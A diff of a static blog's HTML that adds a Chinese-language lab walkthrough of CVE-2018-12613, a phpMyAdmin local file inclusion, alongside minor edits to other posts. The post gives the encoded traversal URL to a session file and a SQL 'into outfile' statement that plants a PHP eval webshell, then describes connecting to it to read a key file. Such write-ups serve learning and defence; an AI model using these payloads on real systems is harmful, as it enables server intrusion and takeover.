@@ -62,6 +62,73 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CVE-2018-12613" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/26/CVE-2018-12613/" class="article-date">
+  <time datetime="2019-03-26T11:54:10.000Z" itemprop="datePublished">2019-03-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/26/CVE-2018-12613/">CVE-2018-12613</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2018-12613"><a href="#CVE-2018-12613" class="headerlink" title="CVE-2018-12613"></a>CVE-2018-12613</h1><h2 id="一"><a href="#一" class="headerlink" title="一."></a>一.</h2><p>打开实验环境，使用弱密码root，root登陆</p>
+<p>参考大佬博客<a href="https://blog.csdn.net/qq_33020901/article/details/80829269" target="_blank" rel="noopener">https://blog.csdn.net/qq_33020901/article/details/80829269</a></p>
+<p>大佬在博客中说：<u>target值会被解析成db_sql.php%3f/../../test.txt</u></p>
+<p>寻找cookie，谷歌浏览器可以在设置中查看：</p>
+<p><img src="https://i.loli.net/2019/03/26/5c9a23cf1b279.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42813/?target=db_sql.php%253f/../../../../../../../../tmp/sess_pjs3c5qe8o5jb86g6fel1kphv3omf0il</span><br></pre></td></tr></table></figure>
+<p>格式为：url + ?target=db_sql.php%253f/../../../../../../../../tmp/sess_你的cookie</p>
+<p>由此得到后台数据：</p>
+<p><img src="https://i.loli.net/2019/03/26/5c9a24c6308a5.png" alt=""></p>
+<p>下面我们来做题</p>
+<p>寻找到目标文件目录地址：</p>
+<p>漏洞产生在index.php的55~63行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// If we have a valid target, let&apos;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! preg_match(&apos;/^index/&apos;, $_REQUEST[&apos;target&apos;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&apos;target&apos;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&apos;target&apos;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&apos;target&apos;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">参考大佬博客：https://www.jianshu.com/p/fb9c2ae16d09</span><br></pre></td></tr></table></figure>
+<p>我们找到index.php的文件路径就可以利用漏洞</p>
+<p><img src="https://i.loli.net/2019/03/27/5c9ae8011c4c2.png" alt=""></p>
+<p>找到index.php在    /var/www/html    中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;SCRIPT_FILENAME&apos;]	        当前执行脚本的绝对路径。</span><br></pre></td></tr></table></figure>
+<h2 id="二"><a href="#二" class="headerlink" title="二."></a>二.</h2><p>打开SQl界面输入一句话木马</p>
+<p><strong>select into outfile 语句，用于将数据导入到pc的指定目录下。(来源于SQL SELECT INTO 语句 )</strong></p>
+<p>即把一句话木马注入到漏洞所在文件夹中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php eval($_POST[a]); ?&gt;&apos; into outfile &apos;/var/www/html/1.php&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/03/26/5c9a18418f37f.png" alt=""></p>
+<p>显示成功即可使用菜刀连接：</p>
+<p>填写网址，直接复制IP地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:42813/1.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/03/26/5c9a1a5be3cd3.png" alt=""></p>
+<p>指定文件1.php，a是菜刀的密码，即前面一句话木马中POST[a]中的a。</p>
+<p>完成之后如下图：</p>
+<p><img src="https://i.loli.net/2019/03/26/5c9a1b2088819.png" alt=""></p>
+<p>在头目录的下方找到key.txt</p>
+<p><img src="https://i.loli.net/2019/03/26/5c9a1b205e530.png" alt=""></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/26/CVE-2018-12613/" data-id="cjtqnugwr0000awu6sqb0o0kp" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-python requests" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/02/13/python requests/" class="article-date">
@@ -85,12 +152,12 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="python-requests库"><a href="#python-requests库" class="headerlink" title="python requests库"></a>python requests库</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">return</span> = requests.get(url=<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">print(<span class="keyword">return</span>.status_code)	<span class="comment">#打印网页返回的状态值</span></span><br><span class="line">print(<span class="keyword">return</span>.text)   <span class="comment">#打印返回数据</span></span><br></pre></td></tr></table></figure>
-<p><a href="https://i.loli.net/2019/03/01/5c7929e0be848.png" target="_blank" rel="noopener">https://i.loli.net/2019/03/01/5c7929e0be848.png</a></p>
+<p><img src="https://i.loli.net/2019/03/01/5c7929e0be848.png" alt=""></p>
 <h6 id="2开头-（请求成功）表示成功处理了请求的状态代码"><a href="#2开头-（请求成功）表示成功处理了请求的状态代码" class="headerlink" title="2开头 （请求成功）表示成功处理了请求的状态代码"></a><strong>2开头 （请求成功）表示成功处理了请求的状态代码</strong></h6><h6 id="3开头-（请求被重定向）表示要完成请求，需要进一步操作。-通常，这些状态代码用来重定向"><a href="#3开头-（请求被重定向）表示要完成请求，需要进一步操作。-通常，这些状态代码用来重定向" class="headerlink" title="3开头 （请求被重定向）表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向"></a><strong>3开头 （请求被重定向）表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向</strong></h6><h6 id="4开头-（请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理"><a href="#4开头-（请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理" class="headerlink" title="4开头 （请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理"></a><strong>4开头 （请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理</strong></h6><h6 id="5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。-这些错误可能是服务器本身的错误，而不是请求出错"><a href="#5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。-这些错误可能是服务器本身的错误，而不是请求出错" class="headerlink" title="5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错"></a><strong>5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错</strong></h6>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/13/python requests/" data-id="cjtmsbs6n0000k4u6v0v80sob" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/13/python requests/" data-id="cjtqnugxl0001awu6atzf6ra8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -167,7 +234,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/01/29/python/" data-id="cjtmsbs730001k4u64gp2gsxb" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/01/29/python/" data-id="cjtqnugy30002awu6z4082r2b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -195,7 +262,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
     </div>
   </div>
 
@@ -206,6 +273,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/03/26/CVE-2018-12613/">CVE-2018-12613</a>
+          </li>
         
           <li>
             <a href="/2019/02/13/python requests/">python</a>
